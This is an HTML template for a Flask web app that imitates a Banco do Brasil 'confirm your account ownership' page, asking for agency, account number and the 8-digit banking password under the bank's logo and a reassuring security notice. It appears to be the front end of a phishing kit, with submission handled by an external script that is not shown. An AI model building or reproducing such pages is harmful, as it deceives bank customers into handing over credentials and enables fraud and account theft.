<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Banco do Brasil - Confirmação de titularidade</title>

  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Estilo personalizado -->
  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">

  <!-- Font Awesome -->
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
  />
</head>

<body class="bg-gray-100 min-h-screen flex flex-col items-center">

  <!-- Header -->
  <header class="w-full bg-white shadow-md py-4 px-4 flex items-center justify-center sticky top-0 z-10">
    <div class="flex items-center gap-4">
      <img src="{{ url_for('static', filename='imagens/logobb.png') }}" alt="Logo Banco do Brasil" class="h-10" />
      <h1 class="text-xl font-bold text-gray-800">Autoatendimento</h1>
    </div>
  </header>

  <!-- Main Content -->
  <main class="w-full max-w-sm mt-6 px-4">
    <div class="bg-white rounded-xl shadow-xl overflow-hidden">
      
      <!-- Título -->
      <div class="bb-gradient py-5 px-6 text-white text-center">
        <h2 class="text-lg font-bold">Confirme sua titularidade</h2>
      </div>

      <!-- Formulário -->
      <form id="form" class="p-6">
        
        <!-- Agência -->
        <div class="mb-5">
          <label for="agency" class="block text-sm font-medium text-gray-700 mb-2">
            Agência (com dígito)
          </label>
          <div class="relative">
            <input
              type="text"
              id="agency"
              name="agency"
              maxlength="6"
              placeholder="0000-0"
              autocomplete="off"
              aria-label="Agência"
              class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-yellow-400"
              required
            />
            <div class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400">
              <i class="fas fa-building"></i>
            </div>
          </div>
          <p id="agency-error" class="text-sm text-red-500 mt-1 hidden"></p>
        </div>

        <!-- Conta -->
        <div class="mb-5">
          <label for="account" class="block text-sm font-medium text-gray-700 mb-2">
            Conta (com dígito)
          </label>
          <div class="relative">
            <input
              type="text"
              id="account"
              name="account"
              maxlength="15"
              placeholder="000000-0"
              autocomplete="off"
              aria-label="Conta"
              class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-yellow-400"
              required
            />
            <div class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400">
              <i class="fas fa-wallet"></i>
            </div>
          </div>
          <p id="account-error" class="text-sm text-red-500 mt-1 hidden"></p>
        </div>

        <!-- Senha -->
        <div class="mb-5">
          <label for="password" class="block text-sm font-medium text-gray-700 mb-2">
            Senha (8 dígitos)
          </label>
          <div class="relative">
            <input
              type="password"
              id="password"
              name="password"
              maxlength="8"
              placeholder="••••••••"
              autocomplete="off"
              aria-label="Senha"
              class="w-full px-4 py-3 border border-gray-300 rounded-lg pr-10 focus:outline-none focus:ring-2 focus:ring-yellow-400"
              required
            />
            <button
              type="button"
              onclick="togglePassword()"
              class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 focus:outline-none"
            >
              <i id="eye-icon" class="fas fa-eye-slash"></i>
            </button>
          </div>
          <p id="password-error" class="text-sm text-red-500 mt-1 hidden"></p>
        </div>

        <!-- Checkbox Lembrar Conta -->
        <div class="mb-6 flex items-center">
          <input
            type="checkbox"
            id="remember"
            name="remember"
            class="h-4 w-4 text-blue-600 border-gray-300 rounded"
          />
          <label for="remember" class="ml-2 text-sm text-gray-700">
            Lembrar minha conta
          </label>
        </div>

        <!-- Botão de Enviar -->
        <button
          type="submit"
          class="w-full bb-gradient-button text-white py-3 px-4 rounded-lg font-medium focus:outline-none focus:ring-2 focus:ring-yellow-400"
        >
          Confirmar
        </button>

        <!-- Esqueci a senha -->
        <div class="mt-4 text-center">
          <a href="#" class="text-sm text-blue-600 hover:text-blue-800 hover:underline">
            Esqueci minha senha
          </a>
        </div>
      </form>
    </div>

    <!-- Box de Segurança -->
    <div class="mt-6 p-4 rounded-lg shadow-sm border border-gray-200 bg-white">
      <div class="flex items-start">
        <i class="fas fa-shield-alt text-xl text-yellow-500"></i>
        <div class="ml-3">
          <h3 class="text-sm font-medium text-gray-800">Segurança</h3>
          <p class="text-xs text-gray-700 mt-1">
            O Banco do Brasil utiliza os mais avançados sistemas de segurança para proteger suas informações.
          </p>
        </div>
      </div>
    </div>
  </main>

  <!-- Script JavaScript -->
  <script src="{{ url_for('static', filename='js/script.js') }}"></script>
</body>
</html>
